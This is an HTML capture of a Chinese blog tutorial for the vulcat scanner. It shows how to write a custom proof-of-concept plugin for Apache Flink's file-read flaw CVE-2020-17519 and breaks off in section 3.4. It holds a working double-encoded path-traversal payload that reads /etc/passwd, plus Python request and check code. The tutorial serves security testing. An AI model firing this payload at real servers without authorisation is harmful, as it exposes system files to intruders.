<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>vulcat自定义POC示例-任意文件读取漏洞 | 某不知名博客</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="安全技术博客,专注安全领域学习与总结。渗透测试,工具开发,国外优秀安全文章翻译,知识库,漏洞库,全球安全事件统计等技术分享。">
    <meta name="keywords" content="漏洞猫,vulcat,个人技术博客,某不知名博客,安全团队,渗透测试,安全,网络安全,安全工具开发,云安全,学习,面试,Python,Golang,markdown">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.cdd53b27.css" as="style"><link rel="preload" href="/assets/js/app.4c7eb560.js" as="script"><link rel="preload" href="/assets/js/2.b3e685a4.js" as="script"><link rel="preload" href="/assets/js/79.b396fb20.js" as="script"><link rel="prefetch" href="/assets/js/10.875b41d4.js"><link rel="prefetch" href="/assets/js/11.377ebe0f.js"><link rel="prefetch" href="/assets/js/12.042c2cd6.js"><link rel="prefetch" href="/assets/js/13.e5e6310b.js"><link rel="prefetch" href="/assets/js/14.c77d9da2.js"><link rel="prefetch" href="/assets/js/15.2eafaab0.js"><link rel="prefetch" href="/assets/js/16.b02b5885.js"><link rel="prefetch" href="/assets/js/17.9069afc5.js"><link rel="prefetch" href="/assets/js/18.b47f0a2b.js"><link rel="prefetch" href="/assets/js/19.e39afacd.js"><link rel="prefetch" href="/assets/js/20.9cbe9955.js"><link rel="prefetch" href="/assets/js/21.40d6f9fa.js"><link rel="prefetch" href="/assets/js/22.48835431.js"><link rel="prefetch" href="/assets/js/23.284731cc.js"><link rel="prefetch" href="/assets/js/24.488f54c8.js"><link rel="prefetch" href="/assets/js/25.2dc810b9.js"><link rel="prefetch" href="/assets/js/26.3bcfe349.js"><link rel="prefetch" href="/assets/js/27.0451ce35.js"><link rel="prefetch" href="/assets/js/28.01fe77f1.js"><link rel="prefetch" href="/assets/js/29.06f44cee.js"><link rel="prefetch" href="/assets/js/3.a5adbaf9.js"><link rel="prefetch" href="/assets/js/30.555f41cd.js"><link rel="prefetch" href="/assets/js/31.4af21c2b.js"><link rel="prefetch" href="/assets/js/32.df29e696.js"><link rel="prefetch" href="/assets/js/33.b0c3d39d.js"><link rel="prefetch" href="/assets/js/34.3fe8c437.js"><link rel="prefetch" href="/assets/js/35.54e364c9.js"><link rel="prefetch" href="/assets/js/36.0a99ffcf.js"><link rel="prefetch" href="/assets/js/37.c3fbc044.js"><link rel="prefetch" href="/assets/js/38.2018d6af.js"><link rel="prefetch" href="/assets/js/39.c6f88326.js"><link rel="prefetch" href="/assets/js/4.d1b60869.js"><link rel="prefetch" href="/assets/js/40.be82609b.js"><link rel="prefetch" href="/assets/js/41.0bbdc51d.js"><link rel="prefetch" href="/assets/js/42.62ab1466.js"><link rel="prefetch" href="/assets/js/43.b5edd141.js"><link rel="prefetch" href="/assets/js/44.cdf06419.js"><link rel="prefetch" href="/assets/js/45.a2d250de.js"><link rel="prefetch" href="/assets/js/46.bffc8362.js"><link rel="prefetch" href="/assets/js/47.43c79a87.js"><link rel="prefetch" href="/assets/js/48.c8f9700a.js"><link rel="prefetch" href="/assets/js/49.072c9ec5.js"><link rel="prefetch" href="/assets/js/5.70a5b3a8.js"><link rel="prefetch" href="/assets/js/50.404fda0f.js"><link rel="prefetch" href="/assets/js/51.411f6584.js"><link rel="prefetch" href="/assets/js/52.30184c4a.js"><link rel="prefetch" href="/assets/js/53.41686030.js"><link rel="prefetch" href="/assets/js/54.7e73b646.js"><link rel="prefetch" href="/assets/js/55.04315c0a.js"><link rel="prefetch" href="/assets/js/56.44f25fb8.js"><link rel="prefetch" href="/assets/js/57.a0299c36.js"><link rel="prefetch" href="/assets/js/58.3fe7655a.js"><link rel="prefetch" href="/assets/js/59.113e07e7.js"><link rel="prefetch" href="/assets/js/6.80c9dd98.js"><link rel="prefetch" href="/assets/js/60.12694070.js"><link rel="prefetch" href="/assets/js/61.45cbb9a7.js"><link rel="prefetch" href="/assets/js/62.c40f1f12.js"><link rel="prefetch" href="/assets/js/63.b228d78a.js"><link rel="prefetch" href="/assets/js/64.7aef2a4f.js"><link rel="prefetch" href="/assets/js/65.7e355a2d.js"><link rel="prefetch" href="/assets/js/66.3cb17be2.js"><link rel="prefetch" href="/assets/js/67.bf45b00b.js"><link rel="prefetch" href="/assets/js/68.0abe2fbc.js"><link rel="prefetch" href="/assets/js/69.0cc14ecf.js"><link rel="prefetch" href="/assets/js/7.853495e2.js"><link rel="prefetch" href="/assets/js/70.266d5e44.js"><link rel="prefetch" href="/assets/js/71.d1b58f41.js"><link rel="prefetch" href="/assets/js/72.26943af0.js"><link rel="prefetch" href="/assets/js/73.5666a022.js"><link rel="prefetch" href="/assets/js/74.e093d711.js"><link rel="prefetch" href="/assets/js/75.d03fc4c8.js"><link rel="prefetch" href="/assets/js/76.59e541b2.js"><link rel="prefetch" href="/assets/js/77.8aa23964.js"><link rel="prefetch" href="/assets/js/78.d1f52c0e.js"><link rel="prefetch" href="/assets/js/8.27f6580a.js"><link rel="prefetch" href="/assets/js/80.85dfa303.js"><link rel="prefetch" href="/assets/js/81.46558dce.js"><link rel="prefetch" href="/assets/js/82.4740166b.js"><link rel="prefetch" href="/assets/js/83.a7abec4f.js"><link rel="prefetch" href="/assets/js/84.6c98cd73.js"><link rel="prefetch" href="/assets/js/9.a84b01c3.js">
    <link rel="stylesheet" href="/assets/css/0.styles.cdd53b27.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="某不知名博客" class="logo"> <span class="site-name can-hide">某不知名博客</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="文档" class="dropdown-title"><!----> <span class="title" style="display:;">文档</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/docs/vulcat/" class="nav-link router-link-active">《vulcat文档》</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="个人学习历程" class="dropdown-title"><!----> <span class="title" style="display:;">个人学习历程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>云原生安全</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/cloud-native-security/kubernetes/preface/" class="nav-link">《Kubernetes教程》</a></li></ul></li><li class="dropdown-item"><h4>过段时间更新...</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/vulcat/custom-payload/poc/404" class="nav-link">《敬请期待》</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/vuln-db/" class="nav-link">漏洞库</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="知识库" class="dropdown-title"><a href="/knowledge/" class="link-title">知识库</a> <span class="title" style="display:none;">知识库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/knowledge/tools/homepage/" class="nav-link">《渗透工具大全》</a></li><li class="dropdown-item"><!----> <a href="/knowledge/cloud-security/concept/" class="nav-link">《云安全》</a></li></ul></div></div><div class="nav-item"><a href="/security-events/" class="nav-link">事件库</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/carsaid/" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://avatars.githubusercontent.com/u/78483995"> <div class="blogger-info"><h3>Carsaid</h3> <span>安全界的小学生</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="文档" class="dropdown-title"><!----> <span class="title" style="display:;">文档</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/docs/vulcat/" class="nav-link router-link-active">《vulcat文档》</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="个人学习历程" class="dropdown-title"><!----> <span class="title" style="display:;">个人学习历程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>云原生安全</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/cloud-native-security/kubernetes/preface/" class="nav-link">《Kubernetes教程》</a></li></ul></li><li class="dropdown-item"><h4>过段时间更新...</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/vulcat/custom-payload/poc/404" class="nav-link">《敬请期待》</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/vuln-db/" class="nav-link">漏洞库</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="知识库" class="dropdown-title"><a href="/knowledge/" class="link-title">知识库</a> <span class="title" style="display:none;">知识库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/knowledge/tools/homepage/" class="nav-link">《渗透工具大全》</a></li><li class="dropdown-item"><!----> <a href="/knowledge/cloud-security/concept/" class="nav-link">《云安全》</a></li></ul></div></div><div class="nav-item"><a href="/security-events/" class="nav-link">事件库</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/carsaid/" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>《vulcat文档》</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/docs/vulcat/" aria-current="page" class="sidebar-link">vulcat简介</a></li><li><a href="/docs/vulcat/download/" class="sidebar-link">vulcat下载</a></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>配置文件</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>运行扫描</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>自定义POC和EXP</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/docs/vulcat/custom-payload/" aria-current="page" class="sidebar-link">说明</a></li><li><a href="/docs/vulcat/custom-payload/poc/" aria-current="page" class="active sidebar-link">vulcat自定义POC示例-任意文件读取漏洞</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_1-准备模板文件" class="sidebar-link">1. 准备模板文件</a></li><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_2-定义payload" class="sidebar-link">2. 定义Payload</a></li><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_3-编写poc主体" class="sidebar-link">3. 编写POC主体</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_3-1-poc基本结构" class="sidebar-link">3.1 POC基本结构</a></li><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_3-2-请求调用" class="sidebar-link">3.2 请求调用</a></li><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_3-3-判断结果-并-返回漏洞信息" class="sidebar-link">3.3 判断结果 并 返回漏洞信息</a></li><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_3-4-start" class="sidebar-link">3.4 Start()</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_4-装填载荷" class="sidebar-link">4. 装填载荷</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_4-1-修改载荷文件名称" class="sidebar-link">4.1 修改载荷文件名称</a></li><li class="sidebar-sub-header level3"><a href="/docs/vulcat/custom-payload/poc/#_4-2-把载荷-放入载荷路径" class="sidebar-link">4.2 把载荷 放入载荷路径</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_5-扫描测试" class="sidebar-link">5. 扫描测试</a></li><li class="sidebar-sub-header level2"><a href="/docs/vulcat/custom-payload/poc/#_6-废话" class="sidebar-link">6. 废话</a></li></ul></li><li><a href="/docs/vulcat/custom-payload/exp/" class="sidebar-link">vulcat自定义EXP示例-文件上传漏洞</a></li></ul></section></li></ul></section></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/categories/?category=%E6%96%87%E6%A1%A3" title="分类" data-v-06225672>文档</a></li><li data-v-06225672><a href="/categories/?category=%E3%80%8Avulcat%E6%96%87%E6%A1%A3%E3%80%8B" title="分类" data-v-06225672>《vulcat文档》</a></li><li data-v-06225672><a href="/categories/?category=%E8%87%AA%E5%AE%9A%E4%B9%89POC%E5%92%8CEXP" title="分类" data-v-06225672>自定义POC和EXP</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://github.com/carsaid" target="_blank" title="作者" class="beLink" data-v-06225672>carsaid</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2023-10-11</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">vulcat自定义POC示例-任意文件读取漏洞<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="自定义攻击载荷-poc示例"><a href="#自定义攻击载荷-poc示例" class="header-anchor">#</a> 自定义攻击载荷-POC示例</h1> <h5 id="本节以apache-flink的任意文件读取漏洞cve-2020-17519为例"><a href="#本节以apache-flink的任意文件读取漏洞cve-2020-17519为例" class="header-anchor">#</a> 本节以Apache Flink的任意文件读取漏洞CVE-2020-17519为例</h5> <h2 id="_1-准备模板文件"><a href="#_1-准备模板文件" class="header-anchor">#</a> 1. 准备模板文件</h2> <p>此处新建一个目录payloads2，并将载荷模板<code>demo.py</code>复制一份，放入该目录
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/02.png" alt=""><figcaption></figcaption></figure><p></p> <p>打开模板文件，其结构如下
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/03.png" alt=""><figcaption></figcaption></figure><p></p> <p>你可以在上方添加注释，例如：</p> <ul><li>漏洞名称</li> <li>漏洞编号</li> <li>Payload来源</li> <li>漏洞描述</li> <li>POC / EXP作者（编写载荷的人）</li> <li>作者个人主页链接</li> <li>...等
<figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/04.png" alt=""><figcaption></figcaption></figure></li></ul> <h2 id="_2-定义payload"><a href="#_2-定义payload" class="header-anchor">#</a> 2. 定义Payload</h2> <p>在__init__方法中，定义该漏洞的有效载荷</p> <p>此处为简便，只定义了一条载荷。</p> <ul><li>在实际运用中，需要对路径、系统等因素设置不同的载荷</li> <li>例如Linux读取/etc/passwd文件</li> <li>Windows读取C:/Windows/win.ini文件等</li></ul> <div class="language-python line-numbers-mode"><pre class="language-python"><code>self<span class="token punctuation">.</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">'path'</span><span class="token punctuation">:</span> <span class="token string">'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/05.png" alt=""><figcaption></figcaption></figure> <h2 id="_3-编写poc主体"><a href="#_3-编写poc主体" class="header-anchor">#</a> 3. 编写POC主体</h2> <h3 id="_3-1-poc基本结构"><a href="#_3-1-poc基本结构" class="header-anchor">#</a> 3.1 POC基本结构</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code>client <span class="token operator">=</span> clients<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'reqClient'</span><span class="token punctuation">)</span>
        
vul_info <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'app_name'</span><span class="token punctuation">:</span> <span class="token string">'ApacheFlink'</span><span class="token punctuation">,</span>
    <span class="token string">'vul_type'</span><span class="token punctuation">:</span> <span class="token string">'FileRead'</span><span class="token punctuation">,</span>
    <span class="token string">'vul_id'</span><span class="token punctuation">:</span> <span class="token string">'CVE-2020-17519'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><ol><li>获取请求客户端<code>client</code></li> <li>定义漏洞信息<code>vul_info</code>，其中的三个字段名称是固定的：app_name、vul_type、vul_id</li></ol> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/06.png" alt=""><figcaption></figcaption></figure> <p>关于请求客户端<code>client</code>，vulcat包装了<code>requests</code>以及<code>HackRequests</code>这两个库
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/07.png" alt=""><figcaption></figcaption></figure><p></p> <p>包装过后，可以对HTTP请求进行统一处理</p> <p>并为其添加一些常用参数，使其更易使用，不用频繁添加参数，例如：</p> <ul><li>requests默认将无视HTTPS证书警告（verify=False）</li> <li>默认超时时间10秒</li> <li>统一的HTTP代理</li> <li>域名</li> <li>协议://域名</li> <li>...等
<figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/08.png" alt=""><figcaption></figcaption></figure></li></ul> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">for</span> payload <span class="token keyword">in</span> self<span class="token punctuation">.</span>payloads<span class="token punctuation">:</span>
    path <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>让我们回到POC的编写当中</p> <p>此时你可以遍历<code>self.payloads</code>，并接收其中的参数
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/09.png" alt=""><figcaption></figcaption></figure><p></p> <h3 id="_3-2-请求调用"><a href="#_3-2-请求调用" class="header-anchor">#</a> 3.2 请求调用</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code>res <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>
    <span class="token string">'get'</span><span class="token punctuation">,</span>
    path<span class="token punctuation">,</span>
    vul_info<span class="token operator">=</span>vul_info
<span class="token punctuation">)</span>
<span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">continue</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>使用客户端<code>client</code>发出请求</p> <ul><li>第一个参数：HTTP方法（大小写不敏感）</li> <li>第二个参数：URL路径<b>（注意，只需要路径，不需要前面的http://xxx.com/，因为vulcat会自动将它们拼接起来）</b></li> <li>额外的参数：vul_info漏洞信息，将作用于HTTP日志（也就是--log选项输出的HTTP信息）</li></ul> <p>接收请求之后，你需要判断结果是否为<code>None</code></p> <ul><li>如果为None，说明请求失败，跳过当前载荷，继续下一轮循环</li> <li>如果不为None，说明请求成功，接下来将判断是否存在漏洞</li></ul> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/10.png" alt=""><figcaption></figcaption></figure> <h3 id="_3-3-判断结果-并-返回漏洞信息"><a href="#_3-3-判断结果-并-返回漏洞信息" class="header-anchor">#</a> 3.3 判断结果 并 返回漏洞信息</h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> lib<span class="token punctuation">.</span>tool <span class="token keyword">import</span> check

<span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">.</span>check_res_fileread<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    results <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Target'</span><span class="token punctuation">:</span> res<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
        <span class="token string">'Type'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>vul_info<span class="token punctuation">[</span><span class="token string">'app_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> vul_info<span class="token punctuation">[</span><span class="token string">'vul_type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> vul_info<span class="token punctuation">[</span><span class="token string">'vul_id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token string">'Request'</span><span class="token punctuation">:</span> res
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> results
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>对于文件读取漏洞，你可以使用vulcat自带的方法<code>check.check_res_fileread()</code>来进行检测</p> <ul><li>如果目标存在文件读取漏洞，则该方法返回 True</li> <li>否则返回 False</li></ul> <p>如果存在漏洞，则返回结果results</p> <ul><li>字符串数据，将以 <b>key:value</b> 的方式显示（例如Target）</li> <li>列表数据，将以 <b>key: v1 v2 v3</b> 的方式显示（例如Type）</li> <li>Response数据，将显示一个<b>HTTP请求数据包</b>（例如Request）</li></ul> <figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/13.png" alt=""><figcaption></figcaption></figure> <p>注意：使用该方法之前需要先导入模块
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/12.png" alt=""><figcaption></figcaption></figure><p></p> <p>这是vulcat自带的<code>check.check_res_fileread()</code>函数，你可以定义统一的检测需求
</p><figure><img src="https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/custom-payloads-fileread/15.png" alt=""><figcaption></figcaption></figure><p></p> <h3 id="_3-4-start"><a href="#_3-4-start" class="header-anchor">#</a> 3.4 Start()</h3> <p>最后，在Start方法中进行调配，此处直接返回一个<code>self.POC(clients)</code>，其中传递了一个参数clients
